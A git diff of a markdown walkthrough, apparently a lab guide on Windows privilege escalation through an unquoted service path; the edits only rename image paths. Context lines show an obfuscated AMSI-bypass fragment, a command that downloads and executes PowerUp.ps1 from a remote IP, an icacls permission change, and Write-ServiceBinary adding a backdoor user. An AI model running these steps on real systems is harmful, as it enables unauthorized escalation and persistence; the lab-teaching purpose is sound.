@@ -46,7 +46,7 @@ Currently the low privileged users can't create any files in the directories wit
 icacls.exe "C:\Program Files\bin folder\program" /grant BUILTIN\Users:W
 ```
 
-![](<../../../.gitbook/assets/image (8) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (8) (1) (1) (1) (1).png>)
 
 6\. Run icacls again the check the permissions on the directory:
 
@@ -104,11 +104,11 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 iex (iwr http://192.168.248.2:8090/PowerUp.ps1 -usebasicparsing)
 ```
 
-![](<../../../.gitbook/assets/image (2) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
 
 4\. Execute `Invoke-AllChecks` to run all the checks from `PowerUp`.
 
-![](<../../../.gitbook/assets/image (23) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (23) (1) (1) (1) (1) (1).png>)
 
 5\. The output tells us there is a service with the name `Service` and it has a **unqouted** service path (`C:\Program Files\bin folder\program\bin x64\service.exe`).
 
@@ -133,7 +133,7 @@ But we do have write permissions in `C:\Program Files\bin folder\program`.
 Write-ServiceBinary -ServiceName 'Service' -ServicePath 'C:\Program Files\bin folder\program\bin.exe' -Username 'privesc' -Password "Welcome2022!" 
 ```
 
-![](<../../../.gitbook/assets/image (22) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (22) (1) (1) (1) (1).png>)
 
 8\. Our current user can't start the service, which means we should restart the machine and check if the user `privesc` is created.
 
